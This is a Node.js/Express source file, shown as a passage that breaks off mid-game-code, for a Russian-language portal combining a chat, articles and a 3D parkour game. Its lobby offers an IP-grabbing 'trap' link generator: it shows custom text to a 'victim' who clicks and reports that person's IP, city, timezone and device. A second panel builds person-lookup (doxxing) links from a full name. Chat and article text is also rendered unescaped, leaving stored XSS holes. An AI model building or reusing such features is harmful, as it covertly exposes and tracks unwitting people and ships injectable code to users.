const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// === СИНХРОННОЕ ЧТЕНИЕ ТЕКСТОВ ДЛЯ ТАБЛИЧЕК ===
const textsFilePath = path.join(__dirname, 'texts.txt');
let signTexts = [
    "Осторожно, сложный прыжок!",
    "CtalkeP — лучший проект 2026 года!",
    "Не смотри вниз!",
    "Кто прочитал, тот упадет (шутка)",
    "Админ следит за тобой...",
    "Баг или фича?",
    "Сделай тройной прыжок!",
    "Здесь был Дефф"
];

// Создаем файл по умолчанию, если его нет
if (!fs.existsSync(textsFilePath)) {
    fs.writeFileSync(textsFilePath, signTexts.join('\n'), 'utf-8');
} else {
    try {
        const fileContent = fs.readFileSync(textsFilePath, 'utf-8');
        signTexts = fileContent.split('\n').map(t => t.trim()).filter(t => t.length > 0);
    } catch (e) {
        console.log('[CtalkeP] Не удалось прочитать texts.txt, используем дефолтные тексты.');
    }
}

// === ХРАНИЛИЩА В ПАМЯТИ ===
let currentTrap = null;     
let lastResult = null;      

// Статьи теперь хранят время создания
let globalArticles = [
    {
        id: "promo",
        title: "Портал запущен!",
        desc: "Система готова к работе.",
        content: "Все модули CtalkeP активированы. Бесконечный 3D-Паркур запущен! Исправлен обзор, добавлены облака, музыка, сквозные таблички и чат в игре.",
        createdAt: Date.now()
    }
];
let chatMessages = [];      
let onlinePlayers = {}; 

// === АВТООЧИСТКА СТАТЕЙ И ОНЛАЙНА ===
setInterval(() => {
    const now = Date.now();
    
    // 1. Очистка статей старше 1 часа (3600000 миллисекунд)
    const beforeLength = globalArticles.length;
    globalArticles = globalArticles.filter(art => {
        // Промо-статью не удаляем, чтобы список не пустовал всегда
        if (art.id === "promo") return true;
        return (now - art.createdAt) < 3600000;
    });

    // 2. Очистка неактивных игроков (офлайн дольше 7 секунд)
    for (const nick in onlinePlayers) {
        if (now - onlinePlayers[nick].lastSeen > 7000) {
            delete onlinePlayers[nick];
        }
    }
}, 5000);

// === АВТОПИНГЕР ===
const APP_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
setInterval(() => {
    axios.get(`${APP_URL}/ping`)
        .then(() => console.log('[CtalkeP] Автопинг.'))
        .catch(err => console.log('[CtalkeP] Ошибка автопинга:', err.message));
}, 600000);

app.get('/ping', (req, res) => res.send('pong'));

// === ГЛАВНЫЙ ИНТЕРФЕЙС ===
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CtalkeP | Premium Portal & 3D Parkour</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <style>
        body { background-color: #050505; color: #e5e7eb; overflow-x: hidden; }
        .neon-border { box-shadow: 0 0 15px rgba(59, 130, 246, 0.25); }
        .neon-text { text-shadow: 0 0 8px rgba(59, 130, 246, 0.6); }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #050505; }
        ::-webkit-scrollbar-thumb { background: #1a1a1a; border-radius: 3px; }
        .joystick-zone { touch-action: none; user-select: none; }
    </style>
</head>
<body class="font-sans min-h-screen flex flex-col justify-between">

    <div id="lobbyView" class="flex flex-col min-h-screen justify-between">
        <header class="border-b border-zinc-900 bg-[#0a0a0a] p-4 sticky top-0 z-50">
            <div class="max-w-6xl mx-auto flex flex-wrap justify-between items-center gap-4">
                <h1 class="text-2xl font-black text-blue-500 tracking-widest neon-text">CtalkeP</h1>
                <div class="flex items-center gap-4">
                    <span class="text-sm bg-zinc-900 px-3 py-1.5 rounded-lg border border-zinc-800 text-zinc-400">
                        Реклама: <span class="text-red-500 font-bold">бесплатный дэфф - @defscool</span>
                    </span>
                    <span class="text-yellow-500 font-bold bg-yellow-950/30 px-3 py-1.5 rounded-lg border border-yellow-900/40" id="balanceDisplay">Баланс: $0.00</span>
                </div>
            </div>
        </header>

        <div class="max-w-6xl mx-auto w-full px-4 mt-6">
            <button onclick="startParkourGame()" class="w-full bg-gradient-to-r from-blue-600 via-indigo-600 to-purple-600 text-white font-black py-4 rounded-xl text-lg uppercase tracking-widest hover:scale-[1.01] transition shadow-lg shadow-indigo-500/20 animate-pulse">
                🎮 ВОЙТИ В ОНЛАЙН 3D ПАРКУР 🎮
            </button>
        </div>

        <main class="max-w-6xl mx-auto p-4 w-full flex-grow grid grid-cols-1 md:grid-cols-3 gap-6">
            <div class="space-y-6">
                <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                    <h2 class="text-md font-bold mb-3 text-blue-400 tracking-wide uppercase">Локальный профиль</h2>
                    <div class="space-y-3">
                        <input type="text" id="nicknameInput" placeholder="Ваш никнейм" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-3 py-2 text-sm text-white outline-none focus:border-blue-500 transition">
                        <button onclick="saveProfile()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded-lg text-sm transition">Сохранить</button>
                    </div>
                </div>

                <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                    <h2 class="text-md font-bold mb-1 text-red-500 tracking-wide uppercase">УЗНАТЬ IP-адрес</h2>
                    <p class="text-xs text-zinc-500 mb-4">Предыдущая ссылка удаляется автоматически при новой генерации.</p>
                    <div class="space-y-3 mb-4">
                        <input type="text" id="trapMessageInput" placeholder="Текст на экране жертвы (например: Твой IP))" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-3 py-2 text-xs text-white outline-none focus:border-red-500 transition">
                    </div>
                    <button onclick="generateTrap()" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-2 rounded-lg text-sm transition">Сгенерировать ссылку</button>
                    <div id="trapArea" class="hidden mt-4 space-y-3">
                        <input type="text" id="trapUrl" readonly class="bg-zinc-900 text-xs text-green-400 p-2 rounded-lg border border-zinc-800 w-full outline-none">
                        <div id="trapStatus" class="text-xs text-yellow-500 animate-pulse bg-yellow-950/10 p-3 rounded-lg border border-yellow-900/30">Ожидание перехода...</div>
                    </div>
                </div>

                <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                    <h2 class="text-md font-bold mb-3 text-indigo-400 tracking-wide uppercase">Глубокий Поиск ФИО</h2>
                    <input type="text" id="fioInput" placeholder="Иванов Иван Иванович" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-3 py-2 mb-3 text-sm text-white outline-none focus:border-indigo-500">
                    <button onclick="searchFIO()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-2 rounded-lg text-sm transition">Анализировать ФИО</button>
                    <div id="fioResults" class="mt-4 space-y-2 hidden"></div>
                </div>
            </div>

            <div class="space-y-6">
                <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                    <h2 class="text-md font-bold mb-3 text-emerald-400 tracking-wide uppercase">Создать статью (+$0.50)</h2>
                    <div class="space-y-3">
                        <input type="text" id="artTitle" placeholder="Заголовок" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg p-2.5 text-sm text-white">
                        <input type="text" id="artDesc" placeholder="Краткое описание" class="w-full bg-zinc-900 border border-zinc-800 rounded-lg p-2.5 text-sm text-white">
                        <textarea id="artContent" rows="4" placeholder="Текст..." class="w-full bg-zinc-900 border border-zinc-800 rounded-lg p-2.5 text-sm text-white"></textarea>
                        <button onclick="publishArticle()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2 rounded-lg text-sm transition">Опубликовать</button>
                    </div>
                </div>

                <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                    <h2 class="text-md font-bold mb-3 text-blue-400 tracking-wide uppercase">Публичные статьи (Живут 1 час)</h2>
                    <div id="articlesList" class="space-y-3 max-h-64 overflow-y-auto pr-1"></div>
                </div>
            </div>

            <div class="space-y-6">
                <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                    <h2 class="text-md font-bold mb-3 text-yellow-500 tracking-wide uppercase">Магазин привилегий</h2>
                    <div class="flex justify-between items-center bg-zinc-950 p-3 rounded-lg border border-zinc-900">
                        <div>
                            <div class="font-bold text-sm text-white">[СТ] Элитный Тэг</div>
                            <div class="text-xs text-zinc-500">Выделяет ваши сообщения</div>
                        </div>
                        <button onclick="buyTag()" class="bg-yellow-600 hover:bg-yellow-700 text-white text-xs font-bold px-3 py-2 rounded-lg transition">$15.00</button>
                    </div>
                </div>

                <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border flex flex-col h-[340px]">
                    <h2 class="text-md font-bold mb-2 text-purple-400 tracking-wide uppercase">Анонимный чат</h2>
                    <div id="chatBox" class="flex-grow overflow-y-auto bg-[#050505] p-3 rounded-lg border border-zinc-900 text-sm space-y-2 mb-3"></div>
                    <div class="flex gap-2">
                        <input type="text" id="chatMessage" placeholder="Сообщение..." class="flex-grow bg-zinc-900 border border-zinc-800 rounded-lg px-3 py-2 text-sm text-white outline-none">
                        <button onclick="sendMessage()" class="bg-purple-600 hover:bg-purple-700 px-4 rounded-lg text-sm font-bold text-white transition">Отправить</button>
                    </div>
                </div>

                <div class="bg-[#0a0a0a] p-5 rounded-xl border border-zinc-900 neon-border">
                    <h2 class="text-md font-bold mb-2 text-zinc-400 tracking-wide uppercase">Кто сейчас в сети 🎮</h2>
                    <div id="statsBox" class="text-sm space-y-1.5 max-h-24 overflow-y-auto"></div>
                </div>
            </div>
        </main>
    </div>

    <div id="gameView" class="hidden fixed inset-0 z-50 bg-[#e0f2fe] select-none flex flex-col overflow-hidden">
        
        <div class="absolute top-4 left-4 z-50 flex flex-col items-start gap-2 pointer-events-none">
            <button onclick="toggleGameChat()" class="bg-black/95 hover:bg-zinc-900 border border-zinc-800 text-white font-bold px-4 py-2 rounded-lg text-xs tracking-wider transition pointer-events-auto flex items-center gap-2">
                <span>💬 ЧАТ ИГРЫ</span>
                <span class="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span>
            </button>
            
            <div id="gameChatWindow" class="hidden w-72 h-48 bg-black/95 border border-zinc-800 rounded-lg flex flex-col p-2.5 pointer-events-auto">
                <div id="gameChatContent" class="flex-grow overflow-y-auto text-xs space-y-1.5 mb-2 pr-1 text-zinc-300"></div>
                <div class="flex gap-1.5">
                    <input type="text" id="gameChatInput" placeholder="Напиши игрокам..." class="flex-grow bg-zinc-900 border border-zinc-800 text-xs px-2 py-1.5 rounded text-white outline-none">
                    <button onclick="sendGameChatMessage()" class="bg-blue-600 hover:bg-blue-700 text-white font-bold px-2.5 rounded text-xs">🚀</button>
                </div>
            </div>
        </div>

        <div class="absolute top-4 right-4 flex items-center gap-4 z-50 pointer-events-none">
            <div class="bg-black/95 px-6 py-3 rounded-lg border border-blue-500/30 flex flex-col items-center pointer-events-auto neon-border">
                <span class="text-[10px] uppercase text-zinc-400 font-bold tracking-widest">Дистанция</span>
                <span class="text-xl font-black text-blue-400 font-mono" id="distanceMeter">0.0м</span>
            </div>

            <button onclick="exitParkourGame()" class="bg-red-600 hover:bg-red-700 text-white font-bold px-5 py-2.5 rounded-lg text-sm transition pointer-events-auto shadow-lg shadow-red-900/20">
                ВЫЙТИ В ЛОББИ
            </button>
        </div>

        <div id="threeJsContainer" class="w-full h-full cursor-pointer"></div>

        <div id="mobileControls" class="hidden absolute inset-0 pointer-events-none select-none">
            <div id="joystickBoundary" class="absolute bottom-10 left-10 w-32 h-32 bg-white/5 border border-white/10 rounded-full flex items-center justify-center pointer-events-auto joystick-zone">
                <div id="joystickKnob" class="w-12 h-12 bg-blue-500/80 rounded-full"></div>
            </div>
            <div id="jumpButton" class="absolute bottom-12 right-12 w-20 h-20 bg-blue-600/60 active:bg-blue-600/90 border border-blue-500 rounded-full flex items-center justify-center pointer-events-auto shadow-lg shadow-blue-500/20 active:scale-95 transition">
                <span class="text-white text-xs font-bold uppercase tracking-wider">UP</span>
            </div>
        </div>
    </div>

    <div id="articleModal" class="hidden fixed inset-0 bg-black/90 flex items-center justify-center p-4 z-50">
        <div class="bg-[#0a0a0a] p-6 rounded-xl border border-zinc-800 max-w-lg w-full">
            <h2 id="modalTitle" class="text-xl font-bold text-blue-400 mb-2"></h2>
            <div id="modalContent" class="text-zinc-300 text-sm whitespace-pre-line mb-4 max-h-96 overflow-y-auto"></div>
            <button onclick="closeModal()" class="w-full bg-zinc-800 hover:bg-zinc-700 py-2 rounded-lg text-white font-bold transition">Закрыть</button>
        </div>
    </div>

    <script>
        let myNickname = localStorage.getItem('nickname') || 'Игрок_' + Math.floor(Math.random()*900 + 100);
        let myBalance = parseFloat(localStorage.getItem('balance')) || 0.0;
        let hasTag = localStorage.getItem('hasTag') === 'true';
        let dailyVisits = parseInt(localStorage.getItem('dailyVisits')) || 0;
        let lastVisitDate = localStorage.getItem('lastVisitDate');
        let localArticles = JSON.parse(localStorage.getItem('saved_articles')) || [];

        // Локальная копия игрового чата (чистится при каждом входе)
        let gameChatHistory = [];

        document.getElementById('nicknameInput').value = myNickname.startsWith('Игрок_') ? '' : myNickname;
        
        const today = new Date().toDateString();
        if (lastVisitDate !== today) {
            dailyVisits += 1;
            localStorage.setItem('dailyVisits', dailyVisits);
            localStorage.setItem('lastVisitDate', today);
        }

        // Обновление онлайна игроков в Лобби
        async function updateLobbyOnline() {
            document.getElementById('balanceDisplay').textContent = 'Баланс: $' + myBalance.toFixed(2);
            try {
                // Пингуем синхронизацию просто чтобы получить актуальный список
                const res = await fetch('/api/parkour/sync', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ nickname: myNickname, lobbyOnly: true })
                });
                const players = await res.json();
                
                const statsBox = document.getElementById('statsBox');
                statsBox.innerHTML = '';
                
                let count = 0;
                for (const nick in players) {
                    count++;
                    const div = document.createElement('div');
                    div.className = "flex justify-between items-center bg-zinc-950 p-1.5 rounded border border-zinc-900";
                    div.innerHTML = \`<span class="text-blue-400 font-medium">👤 \${nick}</span><span class="text-xs text-green-500">В игре 🎮</span>\`;
                    statsBox.appendChild(div);
                }
                if (count === 0) {
                    statsBox.innerHTML = '<div class="text-xs text-zinc-500 italic">На сервере пока никого нет...</div>';
                }
            } catch(e) {}
        }
        setInterval(updateLobbyOnline, 2500);

        function saveProfile() {
            const input = document.getElementById('nicknameInput').value.trim();
            myNickname = input || 'Игрок_' + Math.floor(Math.random()*900 + 100);
            localStorage.setItem('nickname', myNickname);
            updateLobbyOnline();
            alert('Профиль обновлен!');
        }

        function searchFIO() {
            const query = document.getElementById('fioInput').value.trim();
            if (!query) return alert('Введите ФИО!');
            const resultsBox = document.getElementById('fioResults');
            resultsBox.classList.remove('hidden');
            const encoded = encodeURIComponent(query);
            resultsBox.innerHTML = \`
                <div class="p-3 bg-zinc-950 rounded-lg border border-zinc-900 text-xs space-y-2">
                    <div class="text-zinc-400 font-bold border-b border-zinc-900 pb-1">Анализ ФИО: "\${query}"</div>
                    <a href="https://vk.com/people/\${encoded}" target="_blank" class="block text-blue-400 hover:underline">🌐 Пробить ВКонтакте (Прямой поиск)</a>
                    <a href="https://t.me/search?q=\${encoded}" target="_blank" class="block text-cyan-400 hover:underline">💬 Упоминания в Telegram</a>
                    <a href="https://yandex.ru/search/?text=\${encoded}" target="_blank" class="block text-amber-500 hover:underline">🔍 Поиск в Яндекс</a>
                    <a href="https://www.google.com/search?q=\${encoded}" target="_blank" class="block text-red-400 hover:underline">🔍 Поиск в Google</a>
                </div>
            \`;
        }

        let trapCheckInterval = null;
        async function generateTrap() {
            const msgInput = document.getElementById('trapMessageInput').value.trim();
            const res = await fetch('/api/ip/create', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ customText: msgInput })
            });
            const data = await res.json();
            if(data.success) {
                const trapArea = document.getElementById('trapArea');
                const trapUrl = document.getElementById('trapUrl');
                const trapStatus = document.getElementById('trapStatus');
                trapArea.classList.remove('hidden');
                trapUrl.value = data.link;
                trapStatus.textContent = "Ссылка активна. Ждем клика...";
                if (trapCheckInterval) clearInterval(trapCheckInterval);
                trapCheckInterval = setInterval(async () => {
                    const statusRes = await fetch('/api/ip/status');
                    const statusData = await statusRes.json();
                    if (statusData.status === 'caught') {
                        clearInterval(trapCheckInterval);
                        trapStatus.className = "text-xs text-green-400 bg-green-950/10 p-3 rounded-lg border border-green-900/30";
                        trapStatus.innerHTML = '<strong>ПЕРЕХОД ЗАФИКСИРОВАН!</strong><br>IP: ' + statusData.data.ip + '<br>Город: ' + statusData.data.city + '<br>Часовой пояс: ' + statusData.data.timezone + '<br>Устройство: ' + statusData.data.device.substring(0,50) + '...';
                    }
                }, 2000);
            }
        }

        async function loadArticles() {
            try {
                const res = await fetch('/api/articles');
                const serverArticles = await res.json();
                const allArticles = [...serverArticles];
                localArticles.forEach(localArt => {
                    if (!allArticles.some(a => a.id === localArt.id)) allArticles.push(localArt);
                });
                const list = document.getElementById('articlesList');
                list.innerHTML = '';
                allArticles.forEach(art => {
                    const div = document.createElement('div');
                    div.className = "bg-zinc-950 p-3 rounded-lg border border-zinc-900 hover:border-zinc-800 cursor-pointer transition";
                    div.onclick = () => openArticle(art);
                    div.innerHTML = '<h3 class="font-bold text-sm text-white">' + art.title + '</h3><p class="text-xs text-zinc-500">' + art.desc + '</p>';
                    list.appendChild(div);
                });
            } catch (e) {}
        }

        async function publishArticle() {
            const title = document.getElementById('artTitle').value.trim();
            const desc = document.getElementById('artDesc').value.trim();
            const content = document.getElementById('artContent').value.trim();
            if(!title || !content) return alert('Заполните поля!');
            const newArt = { id: Math.random().toString(36).substring(2, 10), title, desc: desc || "Без описания", content };
            localArticles.push(newArt);
            localStorage.setItem('saved_articles', JSON.stringify(localArticles));
            try {
                await fetch('/api/articles', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(newArt)
                });
            } catch (e) {}
            myBalance += 0.50;
            localStorage.setItem('balance', myBalance);
            updateLobbyOnline();
            document.getElementById('artTitle').value = '';
            document.getElementById('artDesc').value = '';
            document.getElementById('artContent').value = '';
            alert('Статья создана! Начислено $0.50');
            loadArticles();
        }

        function openArticle(art) {
            document.getElementById('modalTitle').textContent = art.title;
            document.getElementById('modalContent').textContent = art.content;
            document.getElementById('articleModal').classList.remove('hidden');
        }
        function closeModal() { document.getElementById('articleModal').classList.add('hidden'); }

        async function fetchMessages() {
            try {
                const res = await fetch('/api/chat/messages');
                const data = await res.json();
                const chatBox = document.getElementById('chatBox');
                if (data.length !== chatBox.children.length) {
                    chatBox.innerHTML = '';
                    data.forEach(msg => {
                        const div = document.createElement('div');
                        const tagSpan = msg.tag ? '<span class="text-yellow-400 font-bold mr-1">' + msg.tag + '</span>' : '';
                        div.innerHTML = '<span class="text-zinc-600 text-[10px]">[' + msg.time + ']</span> ' + tagSpan + '<strong class="text-purple-400">' + msg.username + ':</strong> <span class="text-zinc-200">' + msg.text + '</span>';
                        chatBox.appendChild(div);
                    });
                    chatBox.scrollTop = chatBox.scrollHeight;
                }
            } catch (e) {}
        }
        setInterval(fetchMessages, 2000);

        async function sendMessage() {
            const input = document.getElementById('chatMessage');
            const text = input.value.trim();
            if(!text) return;
            await fetch('/api/chat/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: myNickname, text: text, tag: hasTag ? '[СТ]' : '' })
            });
            input.value = '';
            fetchMessages();
        }

        function buyTag() {
            if(hasTag) return alert('Тэг уже куплен!');
            if(myBalance < 15.00) return alert('Нужно $15.00!');
            myBalance -= 15.00;
            hasTag = true;
            localStorage.setItem('balance', myBalance);
            localStorage.setItem('hasTag', 'true');
            updateLobbyOnline();
            alert('Тэг куплен!');
        }

        loadArticles();
        fetchMessages();

        // ==========================================
        //       🎮 МОДУЛЬ 3D БЕСКОНЕЧНОГО ОНЛАЙН ПАРКУРА
        // ==========================================
        let scene, camera, renderer;
        let platforms = []; 
        let otherPlayers = {}; 
        let localClouds = []; // Локальные красивые облака
        let signBoards = [];   // Текстовые парящие таблички
        let isGameActive = false;
        let multiplayerInterval = null;

        let playerPos = { x: 0, y: 1.5, z: 0 };
        let playerVelocity = { x: 0, y: 0, z: 0 };
        let cameraRot = { pitch: 0, yaw: 0 }; 
        let isGrounded = false;
        
        const gravity = -23.5;  
        const jumpStrength = 9.3; 
        const moveSpeed = 7.4;   

        let keys = { w: false, a: false, s: false, d: false, space: false };
        let isTouchDevice = false;
        let joystickActive = false;
        let joystickStart = { x: 0, y: 0 };
        let touchMoveVector = { x: 0, z: 0 };

        let mapSeed = 98765;
        function localRandom() {
            let x = Math.sin(mapSeed++) * 10000;
            return x - Math.floor(x);
        }

        if ('ontouchstart' in window || navigator.maxTouchPoints > 0) {
            isTouchDevice = true;
        }

        // --- ВЕФ-АУДИО СИНТЕЗАТОР БЕСКОНЕЧНОЙ МУЗЫКИ ---
        let audioCtx = null;
        let musicInterval = null;
        function startProceduralMusic() {
            try {
                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                let tempo = 120;
                let step = 0;
                // Весёлая мажорная ретро гамма
                let melody = [60, 64, 67, 72, 69, 67, 64, 62, 60, 67, 72, 76, 74, 72, 67, 69];

                musicInterval = setInterval(() => {
                    if (!isGameActive || audioCtx.state === 'suspended') return;
                    
                    let note = melody[step % melody.length];
                    // Бас-бочка на каждый 4-й шаг
                    if (step % 4 === 0) playKick();
                    // Мелодия играет с пропуском каждого 3-го такта для синкопы
                    if (step % 3 !== 0) playSynthNote(note);

                    step++;
                }, 60000 / tempo / 2); // 16-е доли
            } catch (e) {
                console.log("Аудио недоступно до первого клика.");
            }
        }

        function playSynthNote(midi) {
            let freq = 440 * Math.pow(2, (midi - 69) / 12);
            let osc = audioCtx.createOscillator();
            let gain = audioCtx.createGain();
            
            osc.type = 'triangle'; // Мягкий винтажный звук
            osc.frequency.setValueAtTime(freq, audioCtx.currentTime);

            gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.3);

            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.start();
            osc.stop(audioCtx.currentTime + 0.35);
        }

        function playKick() {
            let osc = audioCtx.createOscillator();
            let gain = audioCtx.createGain();
            osc.frequency.setValueAtTime(150, audioCtx.currentTime);
            osc.frequency.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.12);
            gain.gain.setValueAtTime(0.18, audioCtx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.12);
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.start();
            osc.stop(audioCtx.currentTime + 0.13);
        }

        function startParkourGame() {
            document.getElementById('lobbyView').classList.add('hidden');
            document.getElementById('gameView').classList.remove('hidden');
            document.getElementById('gameUserNick').textContent = myNickname;
            
            // Чистим игровой чат перед новым заходом
            gameChatHistory = [];
            document.getElementById('gameChatContent').innerHTML = '';

            isGameActive = true;

            if (isTouchDevice) {
                document.getElementById('mobileControls').classList.remove('hidden');
                setupMobileEvents();
            } else {
                setupPointerLock();
            }

            init3D();
            setupPhysicsEvents();
            startMultiplayerLoop();
            startProceduralMusic();
        }

        function setupPointerLock() {
            const container = document.getElementById('threeJsContainer');
            container.addEventListener('click', () => {
                container.requestPointerLock();
                if (audioCtx && audioCtx.state === 'suspended') {
                    audioCtx.resume();
                }
            });
        }

        function exitParkourGame() {
            isGameActive = false;
            clearInterval(multiplayerInterval);
            clearInterval(musicInterval);
            document.exitPointerLock();
            
            window.removeEventListener('keydown', handleKeyDown);
            window.removeEventListener('keyup', handleKeyUp);
            window.removeEventListener('mousemove', handleMouseMove);
            window.removeEventListener('resize', onWindowResize);

            const container = document.getElementById('threeJsContainer');
            container.innerHTML = '';

            document.getElementById('gameView').classList.add('hidden');
            document.getElementById('lobbyView').classList.remove('hidden');
            updateLobbyOnline();
        }

        // === ЧАТ ВНУТРИ ИГРЫ ===
        function toggleGameChat() {
            const chatWin = document.getElementById('gameChatWindow');
            chatWin.classList.toggle('hidden');
            if (!chatWin.classList.contains('hidden')) {
                document.getElementById('gameChatInput').focus();
            }
        }

        async function sendGameChatMessage() {
            const input = document.getElementById('gameChatInput');
            const text = input.value.trim();
            if(!text) return;
            await fetch('/api/chat/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: myNickname, text: text, tag: hasTag ? '[СТ]' : '' })
            });
            input.value = '';
        }

        // Обновляем сообщения внутри игры
        async function fetchGameChatMessages() {
            if (!isGameActive) return;
            try {
                const res = await fetch('/api/chat/messages');
                const data = await res.json();
                const container = document.getElementById('gameChatContent');
                
                if (data.length !== gameChatHistory.length) {
                    gameChatHistory = data;
                    container.innerHTML = '';
                    data.forEach(msg => {
                        const div = document.createElement('div');
                        const tagSpan = msg.tag ? '<span class="text-yellow-400 font-bold mr-1">' + msg.tag + '</span>' : '';
                        div.innerHTML = tagSpan + '<strong class="text-blue-400">' + msg.username + ':</strong> <span class="text-white">' + msg.text + '</span>';
                        container.appendChild(div);
                    });
                    container.scrollTop = container.scrollHeight;
                }
            } catch(e) {}
        }
        setInterval(fetchGameChatMessages, 1500);

        function init3D() {
            const container = document.getElementById('threeJsContainer');
            
            scene = new THREE.Scene();
            // Красивый туман (внизу плавно переходит в чисто-белый/небесно-голубой, без черноты!)
            scene.fog = new THREE.FogExp2('#e0f2fe', 0.009);

            camera = new THREE.PerspectiveCamera(65, window.innerWidth / window.innerHeight, 0.1, 1000);
            camera.position.set(playerPos.x, playerPos.y, playerPos.z);

            renderer = new THREE.WebGLRenderer({ antialias: true });
            renderer.setSize(window.innerWidth, window.innerHeight);
            renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
            renderer.setClearColor('#e0f2fe', 1); // Дневное небо светлое!
            container.appendChild(renderer.domElement);

            const ambientLight = new THREE.AmbientLight(0xffffff, 0.85); // Много света!
            scene.add(ambientLight);

            const dirLight = new THREE.DirectionalLight(0xffffff, 0.95);
            dirLight.position.set(20, 100, 20);
            scene.add(dirLight);

            // Создаем красивую процедурную генерацию облаков на небе (локально, без нагрузки)
            generatePrettyClouds();

            // Инициализируем генерацию первой пачки платформ
            resetInfiniteMap();

            let lastTime = performance.now();
            function animate(time) {
                if (!isGameActive) return;
                requestAnimationFrame(animate);

                const dt = Math.min((time - lastTime) / 1000, 0.1); 
                lastTime = time;

                updatePlayerPhysics(dt);
                updateCamera();
                updateInfiniteWorld(); 
                animateClouds(dt);    // Анимируем движение облаков
                renderOtherPlayers();

                renderer.render(scene, camera);
            }
            requestAnimationFrame(animate);

            window.addEventListener('resize', onWindowResize);
        }

        // === ПРОЦЕДУРНЫЕ КРАСИВЫЕ ОБЛАКА ===
        function generatePrettyClouds() {
            localClouds = [];
            // Спавним 25 больших кучевых облаков на небесах (высота 35-50 метров)
            for (let i = 0; i < 25; i++) {
                const cloudGroup = new THREE.Group();
                const cloudSize = Math.random() * 6 + 4;
                
                // Каждое облако собирается из 4-6 пушистых сфер разного диаметра
                const puffCount = Math.floor(Math.random() * 3 + 3);
                const puffMat = new THREE.MeshLambertMaterial({ color: 0xffffff, transparent: true, opacity: 0.9 });

                for (let j = 0; j < puffCount; j++) {
                    const radius = (Math.random() * 0.5 + 0.5) * (cloudSize / 2);
                    const geo = new THREE.SphereGeometry(radius, 8, 8);
                    const mesh = new THREE.Mesh(geo, puffMat);
                    mesh.position.set(
                        (Math.random() - 0.5) * cloudSize,
                        (Math.random() - 0.5) * (cloudSize * 0.3),
                        (Math.random() - 0.5) * cloudSize
                    );
                    cloudGroup.add(mesh);
                }

                // Случайная позиция по площади вокруг центра
                const cx = (Math.random() - 0.5) * 350;
                const cy = Math.random() * 15 + 32; // Высота полета
                const cz = (Math.random() - 0.5) * 350;

                cloudGroup.position.set(cx, cy, cz);
                scene.add(cloudGroup);

                localClouds.push({
                    group: cloudGroup,
                    speed: Math.random() * 0.8 + 0.3, // Скорость плытия
                    baseZ: cz
                });
            }
        }

        function animateClouds(dt) {
            // Плавно двигаем облака. Если уплыло слишком далеко по Z — спавним за спиной у игрока
            localClouds.forEach(cloud => {
                cloud.group.position.z += cloud.speed * dt * 4;
                if (cloud.group.position.z > playerPos.z + 180) {
                    cloud.group.position.z = playerPos.z - 180;
                    cloud.group.position.x = (Math.random() - 0.5) * 300;
                }
            });
        }

        // === ПРОЦЕДУРНАЯ БЕСКОНЕЧНАЯ ГЕНЕРАЦИЯ С ТАБЛИЧКАМИ ===
        let nextPlatformZ = -3.5; 
        let lastPlatformX = 0;
        let lastPlatformY = 0;

        // Получаем тексты табличек от сервера
        let serverSignTexts = signTexts; 

        function resetInfiniteMap() {
            platforms.forEach(p => scene.remove(p.mesh));
            signBoards.forEach(s => scene.remove(s.group));
            platforms = [];
            signBoards = [];

            // Базовая платформа
            createPlatform(0, 0, 0, 6, 0.8, 6, "#3b82f6");

            nextPlatformZ = -3.5;
            lastPlatformX = 0;
            lastPlatformY = 0;
            mapSeed = 98765; 

            // Первые 20 блоков
            for (let i = 0; i < 20; i++) {
                spawnNextBlock();
            }

            respawnPlayer();
        }

        function createPlatform(x, y, z, w, h, d, color) {
            const geometry = new THREE.BoxGeometry(w, h, d);
            const material = new THREE.MeshPhongMaterial({
                color: new THREE.Color(color),
                emissive: new THREE.Color(color),
                emissiveIntensity: 0.35,
                shininess: 80
            });
            const mesh = new THREE.Mesh(geometry, material);
            mesh.position.set(x, y, z);
            scene.add(mesh);

            platforms.push({
                mesh: mesh,
                x, y, z, w, h, d
            });
        }

